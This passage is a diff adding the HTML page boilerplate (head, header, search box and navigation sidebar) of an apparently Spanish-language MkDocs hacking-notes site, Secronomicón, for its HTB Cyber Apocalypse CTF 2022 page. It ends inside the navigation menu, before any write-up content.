@@ -1,0 +1,4293 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+      
+      
+      
+      
+        <link rel="prev" href="../../templates/">
+      
+      
+        <link rel="next" href="../IPN%20Core%202022%20CTF/">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>HTB Cyber Apocalypse CTF 2022 - Secronomicón</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#htb-cyber-apocalypse-ctf-2022" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Secronomicón" class="md-header__button md-logo" aria-label="Secronomicón" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Secronomicón
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HTB Cyber Apocalypse CTF 2022
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/srrequiem/Secronomicon" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    srrequiem/Secronomicon
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Secronomicón" class="md-nav__button md-logo" aria-label="Secronomicón" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Secronomicón
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/srrequiem/Secronomicon" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    srrequiem/Secronomicon
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Secronomicón
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Etiquetas | Tags
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../templates/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Templates
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTFs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            CTFs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_1" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="./" class="md-nav__link md-nav__link--active">
+              
+  
+  <span class="md-ellipsis">
+    HTB Cyber Apocalypse 2022
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            HTB Cyber Apocalypse 2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../IPN%20Core%202022%20CTF/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    IPN Core 2022 CTF
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            IPN Core 2022 CTF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Cheat Sheets
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Cheat Sheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/fuzzing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Fuzzing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/general/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/inyecciones/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Server-Side Template Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Transferencia de archivos
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_6" id="__nav_5_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_6">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/Network/general/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/Network/pivoting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pivoting &amp; Port Forwarding
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_7" id="__nav_5_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Pwning
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_7">
+            <span class="md-nav__icon md-icon"></span>
+            Pwning
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/Pwning/bof-oscp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSCP BOF Cheat Sheet
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cheat%20Sheets/Pwning/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Pwning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Guías
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Guías
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_1" id="__nav_6_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Active Directory
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_1">
+            <span class="md-nav__icon md-icon"></span>
+            Active Directory
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Gu%C3%ADas/Active%20Directory/0_general/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Teoría General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Gu%C3%ADas/Active%20Directory/1_attacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ataques
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Gu%C3%ADas/Kali%20Environment/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Kali Environment
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2">
+            <span class="md-nav__icon md-icon"></span>
+            Kali Environment
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Mobile
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            Mobile
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Gu%C3%ADas/Mobile/General/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Gu%C3%ADas/Mobile/Gu%C3%ADa%20Definitiva%20para%20Captura%20de%20T%C5%95afico/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Guía Definitiva para Captura de Tráfico
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Gu%C3%ADas/OSCP%20BOF/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    OSCP BOF
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
+            <span class="md-nav__icon md-icon"></span>
+            OSCP BOF
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_5" id="__nav_6_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    TCM Security Academy
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_5">
+            <span class="md-nav__icon md-icon"></span>
+            TCM Security Academy
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_5_1" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../Gu%C3%ADas/TCM%20Security%20Academy/Windows%20Privilege%20Escalation/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation
+  </span>
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            Windows Privilege Escalation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    HackTheBox
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
